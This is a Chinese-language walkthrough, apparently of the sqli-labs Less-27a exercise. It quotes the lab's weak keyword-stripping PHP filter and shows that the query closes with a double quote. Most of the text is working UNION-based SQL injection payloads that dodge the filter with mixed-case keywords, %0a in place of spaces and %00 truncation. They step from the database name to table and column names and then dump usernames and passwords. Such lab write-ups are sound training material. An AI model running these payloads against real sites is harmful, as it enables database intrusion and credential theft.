---
title: less27a
url: https://www.yuque.com/u29002979/ep2zrx/lgo2i0n2e5wkpr0w
---

```bash
$id = '"' .$id. '"';
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";

$id= preg_replace('/[\/*]/',"", $id);		//strip out /*
$id= preg_replace('/[--]/',"", $id);		  //Strip out --.
$id= preg_replace('/[#]/',"", $id);			  //Strip out #.
$id= preg_replace('/[ +]/',"", $id);	    //Strip out spaces.

$id= preg_replace('/select/m',"", $id);	  //Strip out spaces.
$id= preg_replace('/[ +]/',"", $id);	    //Strip out spaces.
$id= preg_replace('/union/s',"", $id);	   //Strip out union
$id= preg_replace('/select/s',"", $id);	   //Strip out select
$id= preg_replace('/UNION/s',"", $id);	   //Strip out UNION
$id= preg_replace('/SELECT/s',"", $id);	   //Strip out SELECT
$id= preg_replace('/Union/s',"", $id);	   //Strip out Union
$id= preg_replace('/Select/s',"", $id);	   //Strip out Select
```

发现闭合方式为**双引号**，其余与Less27相同

`1"`

> **Warning**: mysql\_fetch\_array() expects parameter 1 to be resource, boolean given in **E:\phpstudy\_pro\WWW\sql.com\Less-27a\index.php** on line **37**

双引号闭合

<a name="nAsN4"></a>

# 联合注入

> uniOn
> selEct
> %0a：空格
> 00截断：%00

```bash
爆破数据库名称
0"%0a uniOn %0a selEct %0a 1,2,database();%00
爆破数据表名称
0"%0a uniOn %0a selEct %0a 1,2,(selEct %0a group_concat(table_name) %0a from %0a information_schema.tables %0a where %0a table_schema=database());%00 
爆破字段名
0"%0a uniOn %0a selEct %0a 1,2,(selEct%0agroup_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_schema=database()%0aand%0atable_name='users');%00
爆破字段内容
0"%0a uniOn %0a selEct %0a 1,2,(selEct(group_concat(username,0x7e,password))from%0ausers);%00
```
